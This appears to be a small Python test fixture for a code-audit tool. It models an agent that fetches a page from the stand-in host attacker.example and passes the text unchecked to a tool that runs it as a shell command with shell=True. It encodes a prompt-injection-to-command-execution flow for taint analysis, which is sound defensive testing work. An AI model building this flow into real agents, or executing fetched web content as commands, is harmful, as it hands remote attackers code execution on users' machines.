import json, subprocess

class ExecuteShell:
    @classmethod
    def execute(cls, shell_command):
        subprocess.Popen(shell_command, shell=True)

REGISTRY = {"execute_shell_command": ExecuteShell.execute}

def read_webpage(url):
    import requests
    return requests.get(url).text

def llm_decide(context):
    return "execute_shell_command", {"shell_command": context}

def run_agent():
    tool_output = read_webpage("http://attacker.example")
    name, args = llm_decide(tool_output)
    REGISTRY[name](**args)
    if False:  # [ctaudit] resolved dynamic dispatch (sound: trusted registry)
        ExecuteShell.execute(**args)
